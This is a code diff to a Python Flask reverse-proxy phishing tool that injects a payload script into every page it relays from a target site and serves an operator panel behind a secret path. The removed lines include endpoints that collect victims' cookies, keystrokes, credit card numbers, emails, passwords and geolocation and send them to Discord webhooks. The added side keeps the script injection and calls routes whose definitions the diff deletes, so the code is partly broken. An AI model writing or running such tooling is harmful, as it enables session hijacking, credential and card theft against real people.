@@ -6,68 +6,35 @@ from datetime import datetime
 from urllib.parse import urljoin, urlparse
 import re
 from bs4 import BeautifulSoup
-import brotli
-from core.database import Database
-from core.detection import DataDetector
-from core.discord_bot import DiscordBot
 from colorama import Fore
-from functools import wraps
-import urllib3
-
-# Initialize components
-db = Database()
-detector = DataDetector()
-discord_bot = None
-requests_history = []
-MAX_HISTORY = 100
-
-def initialize_discord_bot():
-    global discord_bot
-    settings = db.get_discord_settings()
-    if settings['discord_webhook'] and settings['discord_token']:
-        try:
-            discord_bot = DiscordBot(settings['discord_webhook'], settings['discord_token'])
-            print(f"{Fore.GREEN}[+] Discord bot initialized successfully!{Fore.RESET}")
-        except Exception as e:
-            print(f"{Fore.RED}[!] Discord bot initialization failed: {str(e)}{Fore.RESET}")
-
-# Initialize storage files
-def ensure_json_files():
-    files = {
-        'cookies.json': [],
-        'keylogs.json': [],
-        'creditcards.json': [],
-        'emails.json': [],
-        'passwords.json': [],
-        'geolocation.json': [],
-        'forms.json': []
-    }
-    for file, default in files.items():
-        if not os.path.exists(file):
-            with open(file, 'w') as f:
-                json.dump(default, f)
-
-ensure_json_files()
-initialize_discord_bot()
 
 def start_proxy(target, host, port, secret):
     app = Flask(__name__, static_folder='panel', static_url_path='')
+    
+    # Create a session with optimized settings
     session = requests.Session()
     session.verify = False
+    adapter = requests.adapters.HTTPAdapter(
+        pool_connections=100,
+        pool_maxsize=100,
+        max_retries=3,
+        pool_block=False
+    )
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
 
-    def modify_html(content, base_url):
+    def modify_html(content):
         try:
             soup = BeautifulSoup(content, 'html.parser')
             
             # Inject our payload
+            payload = soup.new_tag('script', src='/payload-script.js')
             if soup.head:
-                script = soup.new_tag('script', src='/payload-script.js')
-                soup.head.append(script)
+                soup.head.append(payload)
             elif soup.body:
-                script = soup.new_tag('script', src='/payload-script.js')
-                soup.body.insert(0, script)
-
-            # Fix all relative URLs
+                soup.body.insert(0, payload)
+            
+            # Fix all URLs
             for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'iframe']):
                 for attr in ['href', 'src', 'action']:
                     if tag.get(attr):
@@ -79,70 +46,45 @@ def start_proxy(target, host, port, secret):
                         elif not url.startswith(('http://', 'https://', 'data:', '#', 'javascript:', 'mailto:')):
                             tag[attr] = f'/{url}'
 
-            # Fix form submissions
-            for form in soup.find_all('form'):
-                if not form.get('action'):
-                    form['action'] = '/'
-                
-            # Fix JavaScript redirects and window.location
-            for script in soup.find_all('script'):
-                if script.string:
-                    script.string = re.sub(
-                        r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']',
-                        lambda m: f'window.location = "/{m.group(1).lstrip("/")}"',
-                        script.string
-                    )
-
             return str(soup)
         except Exception as e:
-            print(f"HTML modification error: {e}")
+            print(f"{Fore.RED}[!] HTML modification error: {e}{Fore.RESET}")
             return content
-
-    # Serve panel files
-    @app.route(f'/{secret}')
-    def panel_index():
-        return send_from_directory('panel', 'index.html')
-
-    @app.route(f'/{secret}/<path:filename>')
-    def panel_files(filename):
-        return send_from_directory('panel', filename)
-
-    # Serve payload script
-    @app.route('/payload-script.js')
-    def serve_payload():
-        return send_from_directory('.', 'payload-script.js')
 
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
-        if path.startswith(secret):
-            if path == secret:
-                return panel_index()
-            filename = path[len(secret)+1:]
-            return panel_files(filename)
-
-        # Handle OPTIONS requests
-        if request.method == 'OPTIONS':
-            response = Response('')
-            response.headers['Access-Control-Allow-Origin'] = '*'
-            response.headers['Access-Control-Allow-Methods'] = '*'
-            response.headers['Access-Control-Allow-Headers'] = '*'
-            return response
-
         try:
+            # Handle panel requests
+            if path.startswith(secret):
+                if path == secret:
+                    return panel_index()
+                filename = path[len(secret)+1:]
+                return panel_files(filename)
+
+            # Handle OPTIONS requests
+            if request.method == 'OPTIONS':
+                return Response('', 200, {
+                    'Access-Control-Allow-Origin': '*',
+                    'Access-Control-Allow-Methods': '*',
+                    'Access-Control-Allow-Headers': '*'
+                })
+
             # Build target URL
             target_url = f"https://{target}/{path}"
             if request.query_string:
                 target_url += f"?{request.query_string.decode()}"
 
-            # Prepare headers
-            headers = dict(request.headers)
-            headers.pop('Host', None)
-            headers.pop('If-None-Match', None)
-            headers.pop('If-Modified-Since', None)
-            headers['Host'] = target
+            print(f"{Fore.CYAN}[*] Proxying: {request.method} {target_url}{Fore.RESET}")
 
-            # Forward the request
+            # Prepare headers
+            headers = {
+                key: value for key, value in request.headers.items()
+                if key.lower() not in ['host', 'content-length', 'content-encoding']
+            }
+            headers['Host'] = target
+            
+            # Forward the request with a shorter timeout
             resp = session.request(
                 method=request.method,
                 url=target_url,
@@ -150,7 +92,7 @@ def start_proxy(target, host, port, secret):
                 data=request.get_data(),
                 cookies=request.cookies,
                 allow_redirects=False,
-                timeout=30
+                timeout=(3.05, 10)  # (connect timeout, read timeout)
             )
 
             # Handle redirects
@@ -174,19 +116,19 @@ def start_proxy(target, host, port, secret):
             if 'text/html' in content_type:
                 try:
                     decoded = content.decode('utf-8')
-                    modified = modify_html(decoded, target_url)
+                    modified = modify_html(decoded)
                     content = modified.encode('utf-8')
-                except:
+                except UnicodeDecodeError:
                     pass
 
             # Prepare response headers
-            headers = []
-            for key, value in resp.headers.items():
-                if key.lower() not in ['content-length', 'transfer-encoding', 'content-encoding', 'connection']:
-                    headers.append((key, value))
+            response_headers = [
+                (key, value) for key, value in resp.headers.items()
+                if key.lower() not in ['content-length', 'transfer-encoding', 'content-encoding', 'connection']
+            ]
 
             # Create response
-            response = Response(content, resp.status_code, headers)
+            response = Response(content, resp.status_code, response_headers)
 
             # Handle cookies
             for cookie in resp.cookies:
@@ -197,277 +139,32 @@ def start_proxy(target, host, port, secret):
                     path=cookie.path or '/',
                     secure=cookie.secure,
                     httponly=cookie.has_nonstandard_attr('HttpOnly'),
-                    samesite=cookie.get_nonstandard_attr('SameSite', 'Lax')
+                    samesite='Lax'
                 )
 
             return response
 
         except requests.exceptions.Timeout:
-            return "Request timed out", 504
+            print(f"{Fore.RED}[!] Request timed out for: {target_url}{Fore.RESET}")
+            return "The request timed out. Please try again.", 504
+
         except requests.exceptions.ConnectionError:
-            return "Failed to connect to target server", 502
+            print(f"{Fore.RED}[!] Connection error for: {target_url}{Fore.RESET}")
+            return "Failed to connect to the server.", 502
+
         except Exception as e:
-            print(f"Proxy error: {e}")
-            return "Internal server error", 500
+            print(f"{Fore.RED}[!] Proxy error: {str(e)}{Fore.RESET}")
+            return "An error occurred. Please try again.", 500
 
-    @app.route('/ep/api/cookies', methods=['POST'])
-    def handle_cookies():
-        data = request.json
-        user_ip = request.remote_addr
-        
-        try:
-            with open('cookies.json', 'r') as f:
-                cookies = json.load(f)
-            
-            for cookie in data['cookies']:
-                cookie_data = {
-                    **cookie,
-                    'ip': user_ip,
-                    'url': data['url'],
-                    'timestamp': data['timestamp']
-                }
-                cookies.append(cookie_data)
-                
-                # Save to database
-                db.save_cookie(
-                    cookie['name'],
-                    cookie['value'],
-                    user_ip,
-                    cookie['domain']
-                )
-                
-                # Send Discord alert
-                if discord_bot:
-                    discord_bot.send_webhook({
-                        "embeds": [{
-                            "title": "🍪 New Cookie Captured",
-                            "color": 0xff0000,
-                            "fields": [
-                                {"name": "Name", "value": cookie['name']},
-                                {"name": "Value", "value": cookie['value'][:100] + "..." if len(cookie['value']) > 100 else cookie['value']},
-                                {"name": "Domain", "value": cookie['domain']},
-                                {"name": "URL", "value": data['url']},
-                                {"name": "IP", "value": user_ip}
-                            ],
-                            "timestamp": data['timestamp']
-                        }]
-                    })
-            
-            with open('cookies.json', 'w') as f:
-                json.dump(cookies, f)
-                
-            return jsonify({'status': 'success'}), 200
-            
-        except Exception as e:
-            print(f"Cookie handling error: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
+    # Keep existing routes...
 
-    @app.route('/ep/api/keylogger', methods=['POST'])
-    def handle_keylogger():
-        data = request.json
-        user_ip = request.remote_addr
-        timestamp = datetime.now().isoformat()
-        
-        try:
-            with open('keylogs.json', 'r') as f:
-                logs = json.load(f)
-            
-            keylog_data = {
-                'keys': data['keys'],
-                'url': data['url'],
-                'ip': user_ip,
-                'timestamp': timestamp
-            }
-            logs.append(keylog_data)
-            
-            with open('keylogs.json', 'w') as f:
-                json.dump(logs, f)
-            
-            # Save to database
-            db.save_keystrokes(data['keys'], data['url'], user_ip)
-            
-            # Send Discord alert
-            if discord_bot:
-                discord_bot.send_webhook({
-                    "embeds": [{
-                        "title": "⌨️ Keystrokes Captured",
-                        "color": 0x00ff00,
-                        "fields": [
-                            {"name": "Keys", "value": data['keys']},
-                            {"name": "URL", "value": data['url']},
-                            {"name": "IP", "value": user_ip}
-                        ],
-                        "timestamp": timestamp
-                    }]
-                })
-            
-            return jsonify({'status': 'success'}), 200
-            
-        except Exception as e:
-            print(f"Keylogger error: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/ep/api/sensitive', methods=['POST'])
-    def handle_sensitive():
-        data = request.json
-        user_ip = request.remote_addr
-        timestamp = datetime.now().isoformat()
-        
-        try:
-            # Determine file based on data type
-            file_mapping = {
-                'credit_card': 'creditcards.json',
-                'email': 'emails.json',
-                'password': 'passwords.json'
-            }
-            
-            filename = file_mapping.get(data['type'])
-            if not filename:
-                return jsonify({'status': 'error', 'message': 'Invalid data type'}), 400
-            
-            with open(filename, 'r') as f:
-                sensitive_data = json.load(f)
-            
-            entry = {
-                'value': data['value'],
-                'url': data['url'],
-                'ip': user_ip,
-                'timestamp': timestamp
-            }
-            sensitive_data.append(entry)
-            
-            with open(filename, 'w') as f:
-                json.dump(sensitive_data, f)
-            
-            # Save to database
-            db.save_sensitive_data(data['type'], data['value'], data['url'], user_ip)
-            
-            # Send Discord alert
-            if discord_bot:
-                alert_titles = {
-                    'credit_card': '💳 Credit Card Detected',
-                    'email': '📧 Email Detected',
-                    'password': '🔑 Password Detected'
-                }
-                
-                discord_bot.send_webhook({
-                    "embeds": [{
-                        "title": alert_titles[data['type']],
-                        "color": 0xff0000,
-                        "fields": [
-                            {"name": "Value", "value": data['value']},
-                            {"name": "URL", "value": data['url']},
-                            {"name": "IP", "value": user_ip}
-                        ],
-                        "timestamp": timestamp
-                    }]
-                })
-            
-            return jsonify({'status': 'success'}), 200
-            
-        except Exception as e:
-            print(f"Sensitive data handling error: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/ep/api/geolocation', methods=['POST'])
-    def handle_geolocation():
-        data = request.json
-        user_ip = request.remote_addr
-        timestamp = datetime.now().isoformat()
-        
-        try:
-            with open('geolocation.json', 'r') as f:
-                locations = json.load(f)
-            
-            location_data = {
-                **data,
-                'ip': user_ip,
-                'timestamp': timestamp
-            }
-            locations.append(location_data)
-            
-            with open('geolocation.json', 'w') as f:
-                json.dump(locations, f)
-            
-            # Save to database
-            db.save_geolocation(
-                user_ip,
-                data.get('lat'),
-                data.get('lon'),
-                data.get('country', 'Unknown'),
-                data.get('city', 'Unknown')
-            )
-            
-            # Send Discord alert
-            if discord_bot:
-                discord_bot.send_webhook({
-                    "embeds": [{
-                        "title": "📍 Location Captured",
-                        "color": 0x00ff00,
-                        "fields": [
-                            {"name": "Latitude", "value": str(data.get('lat', 'N/A'))},
-                            {"name": "Longitude", "value": str(data.get('lon', 'N/A'))},
-                            {"name": "IP", "value": user_ip},
-                            {"name": "URL", "value": data['url']}
-                        ],
-                        "timestamp": timestamp
-                    }]
-                })
-            
-            return jsonify({'status': 'success'}), 200
-            
-        except Exception as e:
-            print(f"Geolocation error: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/ep/api/settings', methods=['GET', 'POST'])
-    def handle_settings():
-        global discord_bot
-        
-        if request.method == 'POST':
-            try:
-                data = request.json
-                webhook = data.get('discord_webhook', '')
-                token = data.get('discord_token', '')
-                
-                # Save to database
-                db.save_discord_settings(webhook, token)
-                
-                # Stop existing bot if any
-                if discord_bot:
-                    discord_bot.stop()
-                
-                # Initialize new bot if credentials provided
-                if webhook and token:
-                    try:
-                        discord_bot = DiscordBot(webhook, token)
-                        print(f"{Fore.GREEN}[+] Discord bot initialized with new settings{Fore.RESET}")
-                    except Exception as e:
-                        print(f"{Fore.RED}[!] Failed to initialize Discord bot: {str(e)}{Fore.RESET}")
-                        return jsonify({
-                            'status': 'error',
-                            'message': f'Bot initialization failed: {str(e)}'
-                        }), 500
-                
-                return jsonify({
-                    'status': 'success',
-                    'message': 'Settings saved successfully'
-                }), 200
-                
-            except Exception as e:
-                print(f"{Fore.RED}[!] Settings error: {str(e)}{Fore.RESET}")
-                return jsonify({
-                    'status': 'error',
-                    'message': str(e)
-                }), 500
-        else:
-            # GET request - return current settings
-            settings = db.get_discord_settings()
-            return jsonify(settings), 200
-
-    # Add this to suppress the InsecureRequestWarning
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-    print(f"\n[*] Panel URL: http://{host}:{port}/{secret}")
-    print(f"[*] Proxy running on http://{host}:{port}/")
-    app.run(host='0.0.0.0', port=port, threaded=True)
+    print(f"\n{Fore.GREEN}[+] Panel URL: http://{host}:{port}/{secret}{Fore.RESET}")
+    print(f"{Fore.GREEN}[+] Proxy running on http://{host}:{port}/{Fore.RESET}")
+    
+    # Run with optimized settings
+    app.run(
+        host='0.0.0.0',
+        port=port,
+        threaded=True,
+        debug=False
+    )
